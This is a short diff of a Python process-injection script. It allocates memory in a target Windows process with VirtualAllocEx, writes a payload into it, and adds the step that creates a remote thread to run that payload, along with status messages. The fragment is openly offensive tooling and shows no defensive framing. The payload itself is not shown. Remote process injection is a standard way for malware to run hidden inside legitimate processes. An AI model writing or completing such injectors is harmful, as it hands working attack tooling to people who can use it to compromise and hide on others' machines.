@@ -18,5 +18,9 @@ if __name__ == "__main__":
    with ProcessInjector(args.PROC, pid=args.pid) as ps_handle:
        # Allocating memory in target process with VirtualAllocEx
        base_addr = ps_handle.virtual_alloc_ex(len(payload))
-       print(base_addr)
-       ps_handle.write_process_memory(base_addr, payload, len(payload))
+       print(f"Base Address @ {base_addr}")
+       print("[+] Writing data into allocated memory...")
+       ps_handle.write_process_memory(payload, len(payload))
+       print("[+] Creating remote thread...")
+       ps_handle.create_remote_thread()
+       print("[+] Remote process memory injection Successful ...")
